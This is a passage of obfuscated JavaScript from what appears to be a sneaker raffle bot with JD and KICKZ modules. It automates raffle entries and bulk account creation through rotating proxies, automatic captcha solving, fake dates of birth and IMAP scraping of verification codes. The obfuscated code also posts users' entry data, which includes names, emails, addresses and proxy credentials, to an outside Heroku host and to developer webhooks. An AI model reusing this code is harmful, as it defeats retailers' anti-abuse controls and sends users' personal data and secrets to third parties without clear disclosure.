                            prxdata = {
                                'username': _0x1d8120['replace']('#', ''),
                                'module': _0x9200ae['name'],
                                'entrydata': JSON['stringify'](_0x46b3c3),
                                'proxy': '' + _0x1d2a3d[_0x412ffb]
                            };
                            var _0x573997 = JSON['stringify'](prxdata);
                            let _0x44af1a = { 'headers': { 'content-type': 'application/json' } };
                            await _0x4012a9['post']('https://jraffles.herokuapp.com/success', _0x573997, _0x44af1a);
                        } catch (_0x394af2) {
                        }
                        const _0x36c418 = {
                            'succesDEVMSG': { 'embeds': [_0x545dcf] },
                            'succesPUBMSG': { 'embeds': [_0x4911a6] }
                        };
                        try {
                            _0x4562fb['webhook'] != undefined && _0x4562fb['webhook'] != '' && await _0xa7b872(_0x4562fb['webhook'], _0x36c418['succesDEVMSG']), await _0x4d97b0(0xc8), await _0xa7b872(_0x27bacd, _0x36c418['succesDEVMSG']), await _0x4d97b0(0xc8), await _0xa7b872(_0x3f583b, _0x36c418['succesPUBMSG']);
                        } catch (_0x31c833) {
                            console['log'](_0x1de0e8['yellow'](_0x1211a5() + '\x20[' + _0x2cac2b[taskModule]['name'] + ']\x20Task\x20' + (_0x412ffb + 0x1) + '\x20:\x20Error\x20sending\x20webhook\x20' + _0x31c833));
                        }
                        console['log'](_0x1de0e8['green'](_0x1211a5() + '\x20[' + _0x9200ae['name'] + ']\x20Task\x20' + (_0x412ffb + 0x1) + '\x20:\x20Raffle\x20Entered!')), (_0x32a330 != 0x0 || _0x2610aa != 0x0 && !_0x5f0136) && (_0x37b8f0['push'](_0x19d724), _0x4a3989['writeFileSync']('forms/templates.json', JSON['stringify'](_0x37b8f0, null, 0x2), 'utf-8'));
                    } catch (_0x490c7e) {
                        console['log'](_0x1de0e8['red'](_0x1211a5() + '\x20[' + _0x9200ae['name'] + ']\x20Task\x20' + (_0x412ffb + 0x1) + '\x20:\x20' + _0x490c7e)), _0x25f5c1 = '' + _0x490c7e;
                        var _0x559fbe = await _0x4ef820(_0x3014c0[_0x412ffb], _0x9200ae, 'dev', !![], _0x25f5c1);
                        let _0x3d182e = {};
                        _0x3d182e['errorDEV'] = { 'embeds': [_0x559fbe] }, _0x4562fb['webhook'] != undefined && _0x4562fb['webhook'] != '' && await _0xa7b872(_0x4562fb['webhook'], _0x3d182e['errorDEV']), await _0xa7b872(_0x5f83c7, _0x3d182e['errorDEV']), _0x5c7c82 = 'yes';
                    } finally {
                        _0x385c02 && _0x385c02['close']();
                        if (_0x5c7c82 == 'yes' && _0x89bf73 != 0x5) {
                            console['log'](_0x1de0e8['red'](_0x1211a5() + '\x20[' + _0x9200ae['name'] + ']\x20Task\x20' + (_0x412ffb + 0x1) + '\x20:\x20Retrying\x20(' + (_0x89bf73 + 0x1) + '\x20/\x205)')), _0x412ffb--, _0x89bf73++;
                            continue;
                        }
                        if (_0x5c7c82 == 'yes' && _0x89bf73 == 0x5) {
                            _0x89bf73 = 0x0, _0x5c7c82 = 'no';
                            continue;
                        }
                        _0x3a20d6('Waiting\x20for\x20' + _0x4562fb['delay'] + '\x20ms'), await _0x4d97b0(_0x4562fb['delay']);
                    }
                }
            }
        }]
    },
    {
        'name': 'JD',
        'modules': [{
            'name': 'JD\x20Raffle\x20Entries',
            'store': 'JD',
            'logo': 'https://upload.wikimedia.org/wikipedia/en/thumb/d/d8/JD_Sports_logo.svg/2048px-JD_Sports_logo.svg.png',
            'function': async function (_0x1e1d94, _0x23fd3c, _0x3df167) {
                var _0x5d0a3b = ![], _0x3dd38f = ![];
                if (_0x4562fb['captchaKey'] == '' || _0x4562fb['captchaKey'] == undefined)
                    return console['log'](_0x1de0e8['yellow']('No\x202Captcha\x20key\x20found\x20in\x20settings.json')), console['log']('Returning\x20to\x20Menu'), menu();
                _0x3621d0['use'](_0x509c12()), _0x3621d0['use'](_0x14703b({
                    'provider': {
                        'id': '2captcha',
                        'token': '' + _0x4562fb['captchaKey']
                    },
                    'visualFeedback': !![]
                }));
                for (var _0x2edc94 = 0x0; _0x2edc94 < _0x23fd3c['length']; _0x2edc94++) {
                    if (_0x3f7b89 != 'yes')
                        var _0x3f7b89 = '', _0x475a8c = 0x0;
                    var _0x2602c2, _0x5d2aa4 = [{
                        'type': 'rich',
                        'title': 'Succesful\x20JD\x20entry',
                        'description': '',
                        'color': 0xc0d6d6,
                        'fields': [
                            {
                                'name': 'Product',
                                'value': '' + _0x23fd3c[_0x2edc94]['Url']
                            },
                            {
                                'name': 'Size',
                                'value': '' + _0x23fd3c[_0x2edc94]['Size']
                            },
                            {
                                'name': 'User',
                                'value': '' + _0x1d8120
                            },
                            {
                                'name': 'Delay',
                                'value': '' + _0x4562fb['delay']
                            },
                            {
                                'name': 'Version',
                                'value': '' + _0x5acae2
                            }
                        ]
                    }];
                    const _0x418947 = { 'embeds': _0x5d2aa4 };
                    _0x81eb1(_0x1e1d94['name'] + '\x20Task\x20' + (_0x2edc94 + 0x1) + '\x20/\x20' + _0x23fd3c['length'] + '\x20||\x20File:\x20' + _0x367847 + '\x20Proxies:\x20' + _0x259b4b);
                    try {
                        await _0x43eceb(_0x23fd3c, _0x2edc94);
                    } catch {
                        _0x3f7b89 = 'no';
                        throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                    }
                    var _0x36871e = await _0x4ef820(_0x23fd3c[_0x2edc94], _0x1e1d94, 'dev', ![]), _0x3d2d43 = await _0x4ef820(_0x23fd3c[_0x2edc94], _0x1e1d94, 'pub', ![]);
                    const _0x53b5d0 = {
                        'succesDEVMSG': { 'embeds': [_0x36871e] },
                        'succesPUBMSG': { 'embeds': [_0x3d2d43] }
                    };
                    if (_0x4562fb['webhook'] != undefined && _0x4562fb['webhook'] != '')
                        try {
                            await _0xa7b872(_0x4562fb['webhook'], _0x53b5d0['succesDEVMSG']);
                        } catch {
                        }
                    await _0x4d97b0(0xc8), await _0xa7b872(_0x27bacd, _0x53b5d0['succesDEVMSG']), await _0x4d97b0(0xc8);
                    try {
                        await _0xa7b872(_0x3f583b, _0x53b5d0['succesPUBMSG']);
                    } catch {
                    }
                    if (_0x23fd3c[_0x2edc94]['Email'] == '' || _0x23fd3c[_0x2edc94]['Url'] == '' || _0x23fd3c[_0x2edc94]['FirstName'] == '' || _0x23fd3c[_0x2edc94]['LastName'] == '') {
                        console['log'](_0x1211a5() + '\x20[' + _0x2cac2b[taskModule]['name'] + ']\x20Task\x20' + (_0x2edc94 + 0x1) + '\x20:\x20Invalid\x20CSV');
                        continue;
                    }
                    if (_0x4562fb['useRandomProxy'] = ![])
                        var _0x4b9227 = _0x3df167[_0x2edc94]['split'](':');
                    else
                        var _0x5d05b7 = Math['round'](Math['random']() * (_0x3df167['length'] - 0x1)), _0x4b9227 = _0x3df167[_0x5d05b7]['split'](':');
                    var _0x13ff04;
                    try {
                        _0x13ff04 = await _0x3621d0['launch']({
                            'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                            'headless': !![],
                            'args': [
                                '--proxy-server=' + _0x4b9227[0x0] + ':' + _0x4b9227[0x1],
                                '--no-sandbox',
                                '--disable-setuid-sandbox'
                            ]
                        });
                    } catch {
                        _0x13ff04 = await _0x3621d0['launch']({
                            'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                            'headless': !![],
                            'args': [
                                '--proxy-server=' + _0x4b9227[0x0] + ':' + _0x4b9227[0x1],
                                '--no-sandbox',
                                '--disable-setuid-sandbox'
                            ]
                        });
                    }
                    try {
                        const _0x4a3dc3 = await _0x13ff04['newPage']();
                        await _0x4a3dc3['authenticate']({
                            'username': '' + _0x4b9227[0x2],
                            'password': '' + _0x4b9227[0x3]
                        }), console['log'](_0x1211a5() + '\x20[' + _0x1e1d94['name'] + ']\x20Task\x20' + (_0x2edc94 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x4a3dc3['setRequestInterception'](!![]), _0x4a3dc3['on']('request', _0x141c10 => {
                            _0x141c10['resourceType']() === 'image' || _0x141c10['resourceType']() === 'font' || _0x141c10['resourceType']() === 'media' ? _0x141c10['abort']() : _0x141c10['continue']();
                        });
                        try {
                            await _0x4a3dc3['goto']('' + _0x23fd3c[_0x2edc94]['Url'], {
                                'waitUntil': 'networkidle2',
                                'timeout': 0xea60
                            });
                        } catch {
                            throw new Error('Connection\x20Error');
                        }
                        try {
                            await _0x4a3dc3['waitForSelector']('#comp_firstname', { 'timeout': 0x7530 });
                        } catch {
                            throw new Error('Not\x20an\x20Active\x20Raffle');
                        }
                        console['log'](_0x1211a5() + '\x20[' + _0x1e1d94['name'] + ']\x20Task\x20' + (_0x2edc94 + 0x1) + '\x20:\x20Filling\x20Information'), await _0x4a3dc3['type']('#comp_firstname', '' + _0x23fd3c[_0x2edc94]['FirstName']), await _0x4a3dc3['waitForSelector']('#comp_lastname'), await _0x4a3dc3['type']('#comp_lastname', '' + _0x23fd3c[_0x2edc94]['LastName']), await _0x4a3dc3['waitForSelector']('#comp_email'), await _0x4a3dc3['type']('#comp_email', '' + _0x23fd3c[_0x2edc94]['Email']), await _0x4a3dc3['waitForSelector']('#comp_paypalemail'), await _0x4a3dc3['type']('#comp_paypalemail', '' + _0x23fd3c[_0x2edc94]['Email']), await _0x4a3dc3['waitForSelector']('#comp_mobile_end'), await _0x4a3dc3['type']('#comp_mobile_end', '' + _0x23fd3c[_0x2edc94]['Phone']), await _0x4a3dc3['waitForSelector']('#comp_dob'), await _0x4a3dc3['type']('#comp_dob', '08/09/1992'), console['log'](_0x1211a5() + '\x20[' + _0x1e1d94['name'] + ']\x20Task\x20' + (_0x2edc94 + 0x1) + '\x20:\x20Choosing\x20Size');
                        if (_0x23fd3c[_0x2edc94]['Size'] == 'RANDOM') {
                            const _0x531846 = await _0x4a3dc3['$$eval']('select[id=\x22shoesize\x22]\x20>\x20option', _0xcf210 => {
                                return _0xcf210['map'](_0x1fc076 => _0x1fc076['value']);
                            });
                            var _0x95ff2d = Math['round'](Math['random']() * (_0x531846['length'] - 0x2));
                            await _0x4a3dc3['select']('#shoesize', _0x531846[_0x95ff2d + 0x1]), await _0x4d97b0(0x3e8);
                        } else {
                            const _0x479cbd = await _0x4a3dc3['$$eval']('select[id=\x22shoesize\x22]\x20>\x20option', _0x8b0730 => {
                                return _0x8b0730['map'](_0x1a408d => _0x1a408d['innerText']);
                            }), _0x21de98 = await _0x4a3dc3['$$eval']('select[id=\x22shoesize\x22]\x20>\x20option', _0x2c241d => {
                                return _0x2c241d['map'](_0x386905 => _0x386905['value']);
                            });
                            var _0x56cad1 = _0x23fd3c[_0x2edc94]['Size'];
                            for (var _0x18f477 = 0x1; _0x18f477 < _0x21de98['length']; _0x18f477++) {
                                var _0x3586ae = _0x479cbd[_0x18f477]['split']('\x20')[0x0];
                                if (_0x3586ae == _0x56cad1) {
                                    await _0x4a3dc3['select']('#shoesize', _0x21de98[_0x18f477]);
                                    break;
                                } else {
                                    if (_0x18f477 + 0x1 == _0x21de98['length'])
                                        throw new Error('Size\x20Not\x20Found..');
                                }
                            }
                        }
                        await _0x4a3dc3['waitForSelector']('#comp_address1'), await _0x4a3dc3['type']('#comp_address1', _0x23fd3c[_0x2edc94]['Address1'] + '\x20' + _0x23fd3c[_0x2edc94]['HouseNumber']), await _0x4a3dc3['waitForSelector']('#comp_address2'), await _0x4a3dc3['type']('#comp_address2', '' + _0x23fd3c[_0x2edc94]['Address2']), await _0x4a3dc3['waitForSelector']('#comp_address2'), await _0x4a3dc3['type']('#comp_address3', '' + _0x23fd3c[_0x2edc94]['City']), await _0x4a3dc3['waitForSelector']('#comp_postcode'), await _0x4a3dc3['type']('#comp_postcode', '' + _0x23fd3c[_0x2edc94]['Zip']), console['log'](_0x1211a5() + '\x20[' + _0x1e1d94['name'] + ']\x20Task\x20' + (_0x2edc94 + 0x1) + '\x20:\x20Sending\x20Entry'), await _0x4d97b0(0x4b0), await _0x4a3dc3['click']('label#emailhold'), await _0x4d97b0(0x5dc), await _0x4a3dc3['click']('#preauth_tandc_email\x20>\x20label'), await _0x4d97b0(0x5dc), await _0x4a3dc3['click']('#submit');
                        try {
                            await _0x4a3dc3['waitForSelector']('#paymentWrap');
                        } catch {
                            throw new Error('Could\x20not\x20find\x20Payment');
                        }
                        console['log'](_0x1211a5() + '\x20[' + _0x1e1d94['name'] + ']\x20Task\x20' + (_0x2edc94 + 0x1) + '\x20:\x20' + _0x1de0e8['blue']('Awaiting\x20Paypal\x20Payment')), _0x13ff04['on']('targetcreated', async _0x54167a => {
                            if (_0x54167a['type']() === 'page') {
                                const _0x22c653 = await _0x54167a['page']();
                                async function _0x12a022() {
                                    try {
                                        await _0x4a3dc3['waitForSelector']('#error_message', { 'timeout': 0x493e0 }), _0x3dd38f = !![];
                                        return;
                                    } catch {
                                    }
                                }
                                async function _0x3fd62e() {
                                    try {
                                        await _0x4a3dc3['waitForSelector']('#successMessage', { 'timeout': 0x493e0 }), _0x5d0a3b = !![];
                                        return;
                                    } catch {
                                    }
                                }
                                _0x3fd62e(), _0x12a022(), await _0x4d97b0(0x493e0);
                            }
                        });
                        async function _0x3b398() {
                            for (let _0x2c0589 = 0x0; _0x2c0589 < 0x12c; _0x2c0589++) {
                                if (_0x5d0a3b == !![]) {
                                    _0x3f7b89 = 'no', _0x3b7ca0(_0x23fd3c[_0x2edc94], _0x1e1d94), console['log'](_0x1de0e8['green'](_0x1211a5() + '\x20[' + _0x1e1d94['name'] + ']\x20Task\x20' + (_0x2edc94 + 0x1) + '\x20:\x20Raffle\x20Entered!'));
                                    if (_0x4562fb['webhook'] != undefined && _0x4562fb['webhook'] != '')
                                        try {
                                            await _0xa7b872(_0x4562fb['webhook'], _0x53b5d0['succesDEVMSG']);
                                        } catch {
                                        }
                                    await _0x4d97b0(0xc8), await _0xa7b872(_0x27bacd, _0x53b5d0['succesDEVMSG']), await _0x4d97b0(0xc8);
                                    try {
                                        await _0xa7b872(_0x3f583b, _0x53b5d0['succesPUBMSG']);
                                    } catch {
                                    }
                                    return;
                                } else {
                                    if (_0x3dd38f)
                                        throw new Error('Paypal\x20Error:\x20Target\x20closed');
                                    else
                                        await _0x4d97b0(0x3e8);
                                }
                            }
                            throw new Error('Paypal\x20Error');
                        }
                        await _0x4d97b0(0xbb8), await _0x4a3dc3['click']('.zoid-outlet'), await _0x4d97b0(0x7d0), await _0x3b398();
                    } catch (_0x76e03b) {
                        console['log'](_0x1de0e8['red'](_0x1211a5() + '\x20[' + _0x1e1d94['name'] + ']\x20Task\x20' + (_0x2edc94 + 0x1) + '\x20:\x20' + _0x76e03b)), _0x2602c2 = '' + _0x76e03b;
                        var _0x5aa419 = await _0x4ef820(_0x23fd3c[_0x2edc94], _0x1e1d94, 'dev', !![], _0x2602c2);
                        _0x53b5d0['errorDEV'] = { 'embeds': [_0x5aa419] }, _0x4562fb['webhook'] != undefined && _0x4562fb['webhook'] != '' && await _0xa7b872(_0x4562fb['webhook'], _0x53b5d0['errorDEV']), await _0xa7b872(_0x5f83c7, _0x53b5d0['errorDEV']);
                    } finally {
                        _0x13ff04 && _0x13ff04['close']();
                        if (_0x3f7b89 == 'yes' && _0x475a8c != 0x5 && _0x2602c2 != 'Size\x20Not\x20Found') {
                            console['log'](_0x1de0e8['red'](_0x1211a5() + '\x20[' + _0x1e1d94['name'] + ']\x20Task\x20' + (_0x2edc94 + 0x1) + '\x20:\x20Retrying\x20(' + _0x475a8c + '\x20/\x205)')), _0x2edc94 = _0x2edc94 - 0x1, _0x475a8c = _0x475a8c + 0x1;
                            continue;
                        }
                        _0x3f7b89 == 'yes' && _0x475a8c >= 0x5 && (_0x320814(afew[_0x2edc94], _0x1e1d94), _0x3f7b89 = 'no', _0x475a8c = 0x0), console['log']('Waiting\x20for\x20' + _0x4562fb['delay'] + '\x20ms'), await _0x4d97b0(_0x4562fb['delay']);
                    }
                }
            }
        }]
    },
    {
        'name': 'KICKZ',
        'modules': [
            {
                'name': 'KICKZ\x20Account\x20Generator',
                'store': 'KICKZ',
                'logo': 'https://scontent-ams2-1.cdninstagram.com/v/t51.2885-19/240479500_928777121004310_8721482303708952556_n.jpg?stp=dst-jpg_s320x320&_nc_ht=scontent-ams2-1.cdninstagram.com&_nc_cat=1&_nc_ohc=9H1DnW3bwMAAX-W7Mo2&edm=AOQ1c0wBAAAA&ccb=7-5&oh=00_AfDjR8EqgPUyl8iQgx56K_94mx_vSIRsFkQbyEq02-zAUQ&oe=63E0E147&_nc_sid=8fd12b',
                'function': async function (_0x1d2b53, _0x56f1a6, _0x151856) {
                    _0x3621d0['use'](_0x509c12()), _0x3621d0['use'](_0x14703b({
                        'provider': {
                            'id': '2captcha',
                            'token': '' + _0x4562fb['captchaKey']
                        },
                        'visualFeedback': !![]
                    }));
                    for (var _0x4cdf52 = 0x0; _0x4cdf52 < _0x56f1a6['length']; _0x4cdf52++) {
                        const _0x4b0e01 = 'https://www.kickz.com/login';
                        if (_0x3babac != 'yes')
                            var _0x3babac = '', _0x4e1d28 = 0x0;
                        _0x81eb1(_0x1d2b53['name'] + '\x20Task\x20' + (_0x4cdf52 + 0x1) + '\x20/\x20' + _0x56f1a6['length'] + '\x20||\x20File:\x20' + _0x367847 + '\x20Proxies:\x20' + _0x259b4b);
                        try {
                            await _0x43eceb(_0x56f1a6, _0x4cdf52);
                        } catch {
                            _0x3babac = 'no';
                            throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                        }
                        var _0x4e86d2 = [{
                            'type': 'rich',
                            'title': 'Succesful\x20Kickz\x20Account\x20Generated',
                            'description': '',
                            'color': 0xc0d6d6,
                            'fields': [
                                {
                                    'name': 'User',
                                    'value': '' + _0x1d8120
                                },
                                {
                                    'name': 'Delay',
                                    'value': '' + _0x4562fb['delay']
                                },
                                {
                                    'name': 'Version',
                                    'value': '' + _0x5acae2
                                }
                            ]
                        }];
                        const _0xe77a5 = { 'embeds': _0x4e86d2 };
                        var _0x579e29 = await _0x4ef820(_0x56f1a6[_0x4cdf52], _0x1d2b53, 'acc', ![]);
                        const _0xceac66 = { 'succesDEVMSG': { 'embeds': [_0x579e29] } };
                        if (_0x56f1a6[_0x4cdf52]['Email'] == '' || _0x56f1a6[_0x4cdf52]['FirstName'] == '' || _0x56f1a6[_0x4cdf52]['LastName'] == '') {
                            console['log'](_0x1211a5() + '\x20[' + _0x1d2b53['name'] + ']\x20Task\x20' + (_0x4cdf52 + 0x1) + '\x20:\x20Invalid\x20CSV');
                            continue;
                        }
                        _0x56f1a6[_0x4cdf52]['Password'] == '' && (_0x56f1a6[_0x4cdf52]['Password'] = 'JRaffles23!');
                        if (_0x4562fb['useRandomProxy'] = ![])
                            var _0x20a9bb = _0x151856[_0x4cdf52]['split'](':');
                        else
                            var _0x4f2028 = Math['round'](Math['random']() * (_0x151856['length'] - 0x1)), _0x20a9bb = _0x151856[_0x4f2028]['split'](':');
                        var _0x18c7ac;
                        try {
                            _0x18c7ac = await _0x3621d0['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x20a9bb[0x0] + ':' + _0x20a9bb[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0x18c7ac = await _0x3621d0['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x20a9bb[0x0] + ':' + _0x20a9bb[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        }
                        try {
                            const _0x476414 = await _0x18c7ac['newPage']();
                            await _0x476414['authenticate']({
                                'username': '' + _0x20a9bb[0x2],
                                'password': '' + _0x20a9bb[0x3]
                            }), console['log'](_0x1211a5() + '\x20[' + _0x1d2b53['name'] + ']\x20Task\x20' + (_0x4cdf52 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x476414['setRequestInterception'](!![]), _0x476414['on']('request', _0x349149 => {
                                _0x349149['resourceType']() === 'image' || _0x349149['resourceType']() === 'font' || _0x349149['resourceType']() === 'media' ? _0x349149['abort']() : _0x349149['continue']();
                            }), await _0x476414['goto'](_0x4b0e01), await _0x4d97b0(0xbb8), console['log'](_0x1211a5() + '\x20[' + _0x1d2b53['name'] + ']\x20Task\x20' + (_0x4cdf52 + 0x1) + '\x20:\x20Starting\x20Registration'), await _0x476414['waitForSelector']('#consent-dialog\x20>\x20section\x20>\x20button'), await _0x476414['click']('#consent-dialog\x20>\x20section\x20>\x20button'), await _0x476414['waitForSelector']('#button-register'), await _0x4d97b0(0x7d0), await _0x476414['evaluate'](() => {
                                const _0x159c31 = document['querySelector']('#button-register');
                                _0x159c31['click']();
                            }), console['log'](_0x1211a5() + '\x20[' + _0x1d2b53['name'] + ']\x20Task\x20' + (_0x4cdf52 + 0x1) + '\x20:\x20Setting\x20Credentials'), await _0x4d97b0(0x1388), await _0x476414['waitForSelector']('#customer_salutation'), await _0x476414['select']('#customer_salutation', 'mr'), await _0x4d97b0(0x7d0), await _0x476414['waitForSelector']('#customer_firstname'), await _0x476414['type']('#customer_firstname', '' + _0x56f1a6[_0x4cdf52]['FirstName']), await _0x4d97b0(0x352), await _0x476414['waitForSelector']('#customer_lastname'), await _0x476414['type']('#customer_lastname', '' + _0x56f1a6[_0x4cdf52]['LastName']), await _0x4d97b0(0x352), await _0x476414['type']('#email-input', '' + _0x56f1a6[_0x4cdf52]['Email']), await _0x4d97b0(0x352), await _0x476414['type']('#email-confirm-input', '' + _0x56f1a6[_0x4cdf52]['Email']), await _0x4d97b0(0x352), await _0x476414['type']('#register-password', '' + _0x56f1a6[_0x4cdf52]['Password']), await _0x4d97b0(0x352), await _0x476414['type']('#password-confirm', '' + _0x56f1a6[_0x4cdf52]['Password']), await _0x4d97b0(0x352), console['log'](_0x1211a5() + '\x20[' + _0x1d2b53['name'] + ']\x20Task\x20' + (_0x4cdf52 + 0x1) + '\x20:\x20Sending\x20Credentials'), await _0x476414['click']('#consent'), await _0x4d97b0(0x1f4);
                            const _0x18039d = await _0x476414['$']('div.inputErrorMsg.b-form_section-message');
                            if (_0x18039d) {
                                console['log'](_0x1de0e8['red'](_0x1211a5() + '\x20[' + _0x1d2b53['name'] + ']\x20Task\x20' + (_0x4cdf52 + 0x1) + '\x20:\x20Your\x20password\x20must\x20contain\x20at\x20least\x20one\x20uppercase\x20&\x20one\x20lowercase\x20letter,\x20one\x20number\x20and\x20one\x20special\x20character.'));
                                continue;
                            }
                            await _0x476414['click']('#buttonRegister');
                            try {
                                await _0x476414['waitForSelector']('#verificationCode');
                            } catch {
                                throw new Error('Account\x20already\x20registered');
                            }
                            console['log'](_0x1211a5() + '\x20[' + _0x1d2b53['name'] + ']\x20Task\x20' + (_0x4cdf52 + 0x1) + '\x20:\x20A\x20verification\x20code\x20has\x20been\x20sent\x20to\x20' + _0x56f1a6[_0x4cdf52]['Email']), await _0x4d97b0(0x4b0);
                            async function _0xc5553e() {
                                var _0x2b0788, _0x974238 = ![];
                                for (var _0x425a10 = 0x0; _0x425a10 < 0x18; _0x425a10++) {
                                    async function _0x51dac9() {
                                        var _0x552d51 = new _0x1aebaf({
                                            'user': _0x4562fb['masterMail'],
                                            'password': _0x4562fb['masterPassword'],
                                            'host': 'imap.gmail.com',
                                            'port': 0x3e1,
                                            'tls': !![],
                                            'autotls': 'always'
                                        });
                                        function _0x1ed0d4(_0x2d1ee8) {
                                            _0x552d51['openBox']('INBOX', ![], _0x2d1ee8);
                                        }
                                        _0x552d51['once']('ready', function () {
                                            console['log'](_0x1211a5() + '\x20[' + _0x1d2b53['name'] + ']\x20Task\x20' + (_0x4cdf52 + 0x1) + '\x20:\x20Opened\x20Mailbox'), _0x1ed0d4(function (_0x470515, _0x15c27d) {
                                                console['log'](_0x1211a5() + '\x20[' + _0x1d2b53['name'] + ']\x20Task\x20' + (_0x4cdf52 + 0x1) + '\x20:\x20Looking\x20for\x20verification\x20mail');
                                                if (_0x470515)
                                                    throw _0x470515;
                                                _0x552d51['seq']['search']([
                                                    'UNSEEN',
                                                    [
                                                        'FROM',
                                                        'verification@kickz.com'
                                                    ]
                                                ], function (_0x1d9888, _0x2d41e5) {
                                                    if (!_0x2d41e5 || !_0x2d41e5['length'])
                                                        console['log'](_0x1211a5() + '\x20[' + _0x1d2b53['name'] + ']\x20No\x20mail\x20found,\x20retrying\x20in\x205\x20seconds'), _0x552d51['end']();
                                                    else {
                                                        var _0x21e258 = _0x552d51['seq']['fetch'](_0x2d41e5, {
                                                            'bodies': '',
                                                            'markSeen': !![]
                                                        });
                                                        _0x21e258['on']('message', function (_0x4d8ed9, _0x17306a) {
                                                            var _0x41bce2 = '(#' + _0x17306a + ')\x20';
                                                            _0x4d8ed9['on']('body', function (_0xf4d919, _0x16ba85) {
                                                                _0x372396(_0xf4d919, (_0x330ce7, _0x51793b) => {
                                                                    if (_0x51793b['subject'] == 'Kickz\x20Account\x20Verification\x20Code') {
                                                                        var _0x40fafa = _0x51793b['html']['split']('<div\x20style=\x22display:block;font-family:Arial,sans-serif;font-size:\x2030px;font-weight:\x20600;line-height:24px;color:#333333\x22>'), _0x4de190 = _0x40fafa[0x1]['split']('<')[0x0];
                                                                        _0x2b0788 = _0x4de190;
                                                                    }
                                                                });
                                                            }), _0x4d8ed9['once']('end', function () {
                                                            });
                                                        }), _0x21e258['once']('error', function (_0x3c5362) {
                                                            console['log']('No\x20mail\x20found,\x20retrying\x20in\x205\x20seconds..');
                                                        }), _0x21e258['once']('end', function () {
                                                            _0x552d51['end']();
                                                        });
                                                    }
                                                });
                                            });
                                        }), _0x552d51['once']('error', function (_0xcd84c5) {
                                            console['log'](_0x1de0e8['red'](_0xcd84c5['message'])), console['log']('Read\x20the\x20guide\x20on\x20how\x20to\x20setup\x20your\x20mailbox'), _0x974238 = !![];
                                        }), _0x552d51['once']('end', async function () {
                                        }), _0x552d51['connect']();
                                    }
                                    _0x51dac9(), await _0x4d97b0(0x1388);
                                    if (_0x2b0788)
                                        return _0x2b0788;
                                    if (_0x974238)
                                        throw new Error('Error\x20connecting\x20to\x20imap');
                                    if (_0x425a10 == 0x18)
                                        throw new Error('Mail\x20not\x20found');
                                }
                            }
                            ;
                            code = await _0xc5553e(), _0x4d97b0(0x320), console['log'](_0x1211a5() + '\x20[' + _0x1d2b53['name'] + ']\x20Task\x20' + (_0x4cdf52 + 0x1) + '\x20:\x20Verifying..'), await _0x476414['type']('#verificationCode', code), await _0x4d97b0(0x1f4), await _0x476414['click']('#buttonVerify'), await _0x4d97b0(0x190), await _0x476414['click']('#buttonVerify'), await _0x4d97b0(0x3e8);
                            try {
                                await _0x476414['waitForSelector']('div.b-user_greeting'), _0x3babac = 'no', console['log'](_0x1de0e8['green'](_0x1211a5() + '\x20[' + _0x1d2b53['name'] + ']\x20Task\x20' + (_0x4cdf52 + 0x1) + '\x20:\x20Account\x20' + _0x56f1a6[_0x4cdf52]['Email'] + '\x20Generated\x20&\x20Verified!')), _0x4a3989['appendFileSync']('../accounts/kickz-verified.csv', '\x0a' + _0x56f1a6[_0x4cdf52]['Email'] + ',' + _0x56f1a6[_0x4cdf52]['Password'] + ','), console['log'](_0x1211a5() + '\x20[' + _0x1d2b53['name'] + ']\x20Task\x20' + (_0x4cdf52 + 0x1) + '\x20:\x20Account\x20' + _0x56f1a6[_0x4cdf52]['Email'] + '\x20Saved\x20in\x20\x27accounts/kickz-verified.csv\x27');
                                try {
                                    _0x4562fb['webhook'] != undefined && _0x4562fb['webhook'] != '' && await _0xa7b872(_0x4562fb['webhook'], _0xceac66['succesDEVMSG']);
                                } catch {
                                }
                                await _0xa7b872(_0x392309, _0xceac66['succesDEVMSG']);
                            } catch {
                                _0x3babac = 'no', console['log'](_0x1de0e8['red'](_0x1211a5() + '\x20[' + _0x1d2b53['name'] + ']\x20Task\x20' + (_0x4cdf52 + 0x1) + '\x20:\x20Verification\x20failed')), console['log'](_0x1de0e8['red'](_0x1211a5() + '\x20[' + _0x1d2b53['name'] + ']\x20Task\x20' + (_0x4cdf52 + 0x1) + '\x20:\x20Account\x20saved\x20in\x20\x27accounts/kickz-unverified.csv\x27'));
                            }
                        } catch (_0x342435) {
                            console['log'](_0x1de0e8['red'](_0x1211a5() + '\x20[' + _0x1d2b53['name'] + ']\x20Task\x20' + (_0x4cdf52 + 0x1) + '\x20:\x20' + _0x342435)), _0x4e86d2[0x0]['title'] = 'Failed\x20kickz\x20Acc\x20Gen', _0x4e86d2[0x0]['description'] = '' + _0x342435, await _0xa7b872(_0x5f83c7, _0xe77a5), _0x3babac = 'yes';
                        } finally {
                            _0x18c7ac && _0x18c7ac['close']();
                            if (_0x3babac == 'yes' && _0x4e1d28 != 0x5) {
                                console['log'](_0x1de0e8['red'](_0x1211a5() + '\x20[' + _0x1d2b53['name'] + ']\x20Task\x20' + (_0x4cdf52 + 0x1) + '\x20:\x20Retrying\x20(' + _0x4e1d28 + '\x20/\x205)')), _0x4cdf52 = _0x4cdf52 - 0x1, _0x4e1d28 = _0x4e1d28 + 0x1;
                                continue;
                            }
                            _0x3babac == 'yes' && _0x4e1d28 >= 0x5 && (_0x320814(_0x56f1a6[_0x4cdf52], _0x1d2b53), _0x3babac = 'no', _0x4e1d28 = 0x0), console['log']('Waiting\x20for\x20' + _0x4562fb['delay'] + '\x20ms'), await _0x4d97b0(_0x4562fb['delay']);
                        }
                    }
                }
            },
            {
                'name': 'KICKZ\x20Raffle\x20Entries',
